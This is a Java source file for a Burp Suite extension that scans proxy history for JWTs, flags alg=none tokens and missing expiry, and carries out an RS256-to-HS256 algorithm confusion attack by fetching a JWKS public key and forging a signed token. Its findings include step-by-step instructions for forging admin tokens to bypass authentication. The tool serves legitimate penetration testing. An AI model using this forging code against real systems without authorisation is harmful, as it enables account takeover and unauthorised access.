package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.proxy.ProxyHttpRequestResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.VulnCheck;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.math.BigInteger;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.RSAPublicKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Scans the Burp Proxy history for JWTs (Authorization: Bearer ...) sent to
 * the target host, decodes the header/payload (no key needed, it's just
 * Base64) and flags common weaknesses:
 *   - alg: none (unsigned token)
 *   - weak alg (HS256 isn't weak by itself, but we flag it for manual review)
 *   - missing "exp" claim (a token with no expiration)
 *
 * This check is PASSIVE over traffic that already went through the proxy —
 * so manually browse the application (while logged in) before running the
 * scan to populate the history with tokens.
 *
 * Created by Rx0 - @rodrigocoutinho91
 */
public class JwtWeaknessCheck implements VulnCheck {

    @Override
    public String name() {
        return "Weak JWTs in the proxy history";
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl) {
        List<Finding> findings = new ArrayList<>();
        Set<String> seenTokens = new HashSet<>();

        String targetHost;
        try {
            targetHost = URI.create(baseUrl).getHost();
        } catch (Exception e) {
            return findings;
        }
        if (targetHost == null) return findings;

        List<ProxyHttpRequestResponse> history;
        try {
            history = api.proxy().history();
        } catch (Exception e) {
            api.logging().logToError("[Rx0] Could not read the proxy history: " + e.getMessage());
            return findings;
        }

        for (ProxyHttpRequestResponse item : history) {
            try {
                if (item.finalRequest() == null) continue;
                String host = item.finalRequest().httpService().host();
                if (host == null || !host.equalsIgnoreCase(targetHost)) continue;

                for (HttpHeader h : item.finalRequest().headers()) {
                    if (!h.name().equalsIgnoreCase("Authorization")) continue;
                    String value = h.value();
                    if (!value.toLowerCase().startsWith("bearer ")) continue;

                    String token = value.substring(7).trim();
                    if (!seenTokens.add(token)) continue; // already analyzed this token
                    if (token.chars().filter(c -> c == '.').count() != 2) continue; // doesn't look like a JWT (header.payload.sig)

                    analyzeToken(api, findings, token, item.finalRequest().url(), baseUrl);
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Error processing proxy history item: " + e.getMessage());
            }
        }
        return findings;
    }

    private void analyzeToken(MontoyaApi api, List<Finding> findings, String token, String sourceUrl, String baseUrl) {
        String[] parts = token.split("\\.");
        if (parts.length < 2) return;

        String headerJson = decodeBase64Url(parts[0]);
        String payloadJson = decodeBase64Url(parts[1]);
        if (headerJson == null || payloadJson == null) return;

        String headerLower = headerJson.toLowerCase();
        String payloadLower = payloadJson.toLowerCase();

        if (headerLower.contains("\"alg\":\"none\"") || headerLower.contains("\"alg\": \"none\"")) {
            findings.add(new Finding(
                    "JWT with alg=none (unsigned token)",
                    Severity.CRITICAL,
                    sourceUrl,
                    "A JWT sent to the target host was found with algorithm 'none' in its header, " +
                            "meaning the token has no verifiable signature — any payload can be forged.",
                    "Decoded header: " + headerJson,
                    "Never accept tokens with alg=none. Force verification of a specific algorithm (e.g. RS256) on the backend.",
                    "1) In Burp Decoder (or jwt.io), take the original token and edit the payload (e.g. change \"role\":\"user\" to " +
                            "\"role\":\"admin\" or \"sub\" to another user ID). 2) Re-encode the header and payload as Base64URL, " +
                            "drop the signature (keep only the two segments plus a trailing dot: header.payload.). " +
                            "3) Send this forged token in the Authorization: Bearer <token> header and confirm whether the server accepts it — " +
                            "this is a full authentication/authorization bypass with no need for the signing key."));
        }

        if (!payloadLower.contains("\"exp\"")) {
            findings.add(new Finding(
                    "JWT with no expiration claim (exp)",
                    Severity.MEDIUM,
                    sourceUrl,
                    "The JWT found has no 'exp' claim, meaning the token never expires — if it leaks, " +
                            "it can be reused indefinitely.",
                    "Decoded payload (partial): " + summarize(payloadJson, 200),
                    "Always set a short expiration time for access tokens and use refresh tokens for long sessions."));
        }

        // --- Algorithm Confusion: RS256 -> HS256 using the public key as the HMAC secret ---
        if (headerLower.contains("\"alg\":\"rs256\"") || headerLower.contains("\"alg\": \"rs256\"")
                || headerLower.contains("\"alg\":\"rs384\"") || headerLower.contains("\"alg\":\"rs512\"")) {
            tryAlgorithmConfusion(api, findings, headerJson, parts[0], parts[1], sourceUrl, baseUrl);
        }
    }

    private void tryAlgorithmConfusion(MontoyaApi api, List<Finding> findings, String headerJson,
                                        String headerB64, String payloadB64, String sourceUrl, String baseUrl) {
        try {
            String publicKeyPem = findJwksPublicKey(api, baseUrl);
            if (publicKeyPem == null) return; // JWKS not found — can't forge without the public key

            // Forged header: swap the algorithm to HS256, keeping everything else the same
            String forgedHeader = headerJson.replaceAll("\"alg\"\\s*:\\s*\"RS\\d+\"", "\"alg\":\"HS256\"")
                    .replaceAll("\"alg\"\\s*:\\s*\"rs\\d+\"", "\"alg\":\"HS256\"");
            String forgedHeaderB64 = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(forgedHeader.getBytes(StandardCharsets.UTF_8));

            String dataToSign = forgedHeaderB64 + "." + payloadB64;

            // Tests one variant of the "secret": the full PEM text — different vulnerable
            // libraries handle this differently (raw DER bytes is another common variant).
            String signatureWithPem = signHmacSha256(dataToSign, publicKeyPem.getBytes(StandardCharsets.UTF_8));
            String forgedToken = dataToSign + "." + signatureWithPem;

            findings.add(new Finding(
                    "JWT Algorithm Confusion (RS256→HS256) — forged token generated",
                    Severity.CRITICAL,
                    sourceUrl,
                    "The token uses RSA (RS256/384/512) and a public JWKS key was found publicly on the target. This " +
                            "enables the classic algorithm confusion attack: if the backend verifies the signature " +
                            "generically (without pinning the expected algorithm), it may accept an HS256 token signed " +
                            "using the RSA public key ITSELF (which is public, anyone has access to it) as the HMAC secret — " +
                            "a full authentication bypass without ever having the private key.",
                    "JWKS public key successfully retrieved. A forged token was generated (see exploitation steps) using the " +
                            "public key in PEM format as the HMAC-SHA256 secret.",
                    "Explicitly pin the expected algorithm when verifying the JWT on the backend (e.g. jwt.verify(token, key, " +
                            "{algorithms: ['RS256']}) — NEVER let the library decide the algorithm from the token's own " +
                            "header, which is attacker-controlled.",
                    "1) Use this forged token (copy exactly): " + forgedToken + " 2) Send it in an " +
                            "Authorization: Bearer <token> header against a protected endpoint on the target. 3) If accepted, this is a " +
                            "full authentication bypass — you can edit the payload before forging (e.g. change 'role' to " +
                            "'admin') to any claim you want, since the 'secret' used (the public key) is known."));
        } catch (Exception e) {
            api.logging().logToError("[Rx0] Error attempting JWT Algorithm Confusion: " + e.getMessage());
        }
    }

    /** Looks for the RSA public key on common JWKS endpoints and returns it in PEM format, or null if not found. */
    private String findJwksPublicKey(MontoyaApi api, String baseUrl) {
        if (baseUrl == null) return null;
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
        String[] jwksPaths = {"/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration/jwks", "/oauth/jwks"};

        for (String path : jwksPaths) {
            try {
                HttpResponse resp = api.http().sendRequest(HttpRequest.httpRequestFromUrl(base + path)).response();
                if (resp == null || resp.statusCode() != 200) continue;
                String body = resp.bodyToString();
                if (body == null || !body.contains("\"n\"") || !body.contains("\"e\"")) continue;

                String nB64 = extractField(body, "n");
                String eB64 = extractField(body, "e");
                if (nB64 == null || eB64 == null) continue;

                BigInteger modulus = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(nB64)));
                BigInteger exponent = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(eB64)));

                KeyFactory kf = KeyFactory.getInstance("RSA");
                PublicKey key = kf.generatePublic(new RSAPublicKeySpec(modulus, exponent));

                String der = Base64.getMimeEncoder(64, "\n".getBytes(StandardCharsets.UTF_8)).encodeToString(key.getEncoded());
                return "-----BEGIN PUBLIC KEY-----\n" + der + "\n-----END PUBLIC KEY-----\n";
            } catch (Exception ignored) {
                // try the next path
            }
        }
        return null;
    }

    private String extractField(String json, String field) {
        Matcher m = Pattern.compile("\"" + field + "\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
        return m.find() ? m.group(1) : null;
    }

    private String signHmacSha256(String data, byte[] secret) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(secret, "HmacSHA256"));
        byte[] signature = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
        return Base64.getUrlEncoder().withoutPadding().encodeToString(signature);
    }

    private String decodeBase64Url(String s) {
        try {
            return new String(Base64.getUrlDecoder().decode(padBase64(s)), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private String padBase64(String s) {
        int remainder = s.length() % 4;
        if (remainder == 0) return s;
        return s + "=".repeat(4 - remainder);
    }

    private String summarize(String text, int max) {
        if (text.length() <= max) return text;
        return text.substring(0, max) + "...";
    }
}
